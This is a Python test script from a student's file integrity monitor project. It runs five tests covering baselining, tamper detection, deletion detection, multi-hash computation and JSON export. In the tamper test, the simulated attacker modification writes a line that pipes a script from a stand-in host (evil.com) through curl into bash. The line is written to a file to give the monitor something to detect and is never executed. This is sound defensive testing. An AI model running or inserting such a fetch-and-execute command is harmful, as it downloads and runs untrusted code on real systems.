# Samuvel A | 727823TUCY040
# student_name: Samuvel A
# roll_number: 727823TUCY040
# project_name: File Integrity Monitor
# date: 2026-03-29

import os
import sys
import json
import datetime
import time
import sqlite3

ROLL_NUMBER = "727823TUCY040"
STUDENT_NAME = "Samuvel A"
DB_FILE = "fim_727823TUCY040.db"
LOG_FILE = "run_log_727823TUCY040.log"
RESULTS_FILE = "results_727823TUCY040.json"


def log(msg):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


def print_header():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print("=" * 65)
    print(f"  RUN TOOL — File Integrity Monitor")
    print(f"  Roll Number : {ROLL_NUMBER}")
    print(f"  Timestamp   : {timestamp}")
    print(f"  Student     : {STUDENT_NAME}")
    print("=" * 65)


sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from tool_main import (
    init_db, record_baseline, check_file, record_alert,
    compute_hash, get_file_metadata, export_baseline_json,
    create_test_file
)

test_results = []


def record(test_id, description, passed, details):
    status = "PASS" if passed else "FAIL"
    log(f"  [{status}] {description}")
    test_results.append({
        "test_id": test_id,
        "description": description,
        "status": status,
        "details": details,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })


def clear_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute("DELETE FROM baseline")
    conn.execute("DELETE FROM alerts")
    conn.commit()
    conn.close()


def cleanup_test_files():
    for f in ["tc1_727823.txt", "tc2_727823.py", "tc3_727823.cfg",
              "tc4_727823.sh", "tc5_727823.log"]:
        try:
            os.remove(f)
        except FileNotFoundError:
            pass


def run_test_case_1():
    """TC1: Baseline a file and verify it is intact — no modifications."""
    log("=== TEST CASE 1: Baseline & Integrity Verification (No Tampering) ===")
    create_test_file("tc1_727823.txt", "hostname=webserver01\nip=192.168.1.10\nstatus=active\n")
    record_baseline("tc1_727823.txt")
    changes = check_file("tc1_727823.txt")
    if not changes:
        record("TC1", "Baseline & integrity check — file intact", True,
               "SHA256 and metadata matched baseline exactly")
    else:
        record("TC1", "Baseline & integrity check — file intact", False,
               f"Unexpected changes: {changes}")


def run_test_case_2():
    """TC2: Detect content modification (hash change + size change)."""
    log("=== TEST CASE 2: Detect Content Modification (Tampering) ===")
    create_test_file("tc2_727823.py", "# Legitimate script\nprint('System check OK')\n")
    record_baseline("tc2_727823.py")
    time.sleep(1)
    # Simulate attacker modifying the file
    create_test_file("tc2_727823.py",
                     "# TAMPERED by attacker\nimport os\nos.system('curl http://evil.com/shell.sh | bash')\n")
    changes = check_file("tc2_727823.py")
    for ch in changes:
        record_alert("tc2_727823.py", ch[0], ch[1], ch[2])
    if any(c[0] == "HASH_CHANGED" for c in changes):
        record("TC2", "Detect file content modification", True,
               f"Changes detected: {[c[0] for c in changes]}")
    else:
        record("TC2", "Detect file content modification", False,
               "Hash change NOT detected — FIM failure")


def run_test_case_3():
    """TC3: Detect file deletion."""
    log("=== TEST CASE 3: Detect File Deletion ===")
    create_test_file("tc3_727823.cfg", "admin_password=secret123\ndb_host=localhost\n")
    record_baseline("tc3_727823.cfg")
    os.remove("tc3_727823.cfg")
    changes = check_file("tc3_727823.cfg")
    for ch in changes:
        record_alert("tc3_727823.cfg", ch[0], ch[1], ch[2])
    if any(c[0] == "FILE_DELETED" for c in changes):
        record("TC3", "Detect file deletion", True,
               "FILE_DELETED alert raised correctly")
    else:
        record("TC3", "Detect file deletion", False,
               "Deletion not detected")


def run_test_case_4():
    """TC4: Verify multi-algorithm hashing (SHA256, MD5, SHA1)."""
    log("=== TEST CASE 4: Multi-Algorithm Hash Comparison ===")
    create_test_file("tc4_727823.sh", "#!/bin/bash\necho 'backup started'\nrsync -av /data /backup\n")
    sha256 = compute_hash("tc4_727823.sh", "sha256")
    md5 = compute_hash("tc4_727823.sh", "md5")
    sha1 = compute_hash("tc4_727823.sh", "sha1")
    if sha256 and md5 and sha1 and len(sha256) == 64 and len(md5) == 32:
        record("TC4", "Multi-algorithm hash verification", True,
               f"SHA256={sha256[:16]}... MD5={md5[:16]}... SHA1={sha1[:16]}...")
    else:
        record("TC4", "Multi-algorithm hash verification", False,
               f"Hash computation failed: SHA256={sha256}, MD5={md5}")


def run_test_case_5():
    """TC5: Monitor multiple files and export baseline report."""
    log("=== TEST CASE 5: Multi-File Monitoring & Baseline Export ===")
    create_test_file("tc5_727823.log", "2026-03-29 10:00:00 — Service started\n")
    record_baseline("tc4_727823.sh")
    record_baseline("tc5_727823.log")
    record_baseline("tc1_727823.txt")
    export_baseline_json()

    import os
    if os.path.isfile("baseline_727823TUCY040.json"):
        with open("baseline_727823TUCY040.json") as f:
            data = json.load(f)
        record("TC5", "Multi-file monitoring & baseline JSON export", True,
               f"Baseline contains {len(data)} file(s) with full metadata")
    else:
        record("TC5", "Multi-file monitoring & baseline JSON export", False,
               "baseline_727823TUCY040.json not created")


def save_results():
    with open(RESULTS_FILE, "w") as f:
        json.dump(test_results, f, indent=2)
    log(f"Results saved to {RESULTS_FILE}")


if __name__ == "__main__":
    print_header()
    log(f"Roll Number: {ROLL_NUMBER} | run_tool.py started")

    init_db()
    clear_db()
    cleanup_test_files()

    run_test_case_1()
    run_test_case_2()
    run_test_case_3()
    run_test_case_4()
    run_test_case_5()

    save_results()

    passed = sum(1 for r in test_results if r["status"] == "PASS")
    total = len(test_results)
    log(f"Roll Number: {ROLL_NUMBER} | Test Summary: {passed}/{total} PASSED")
    print("=" * 65)
    print(f"  Results : {RESULTS_FILE}")
    print(f"  Log     : {LOG_FILE}")
    print("=" * 65)
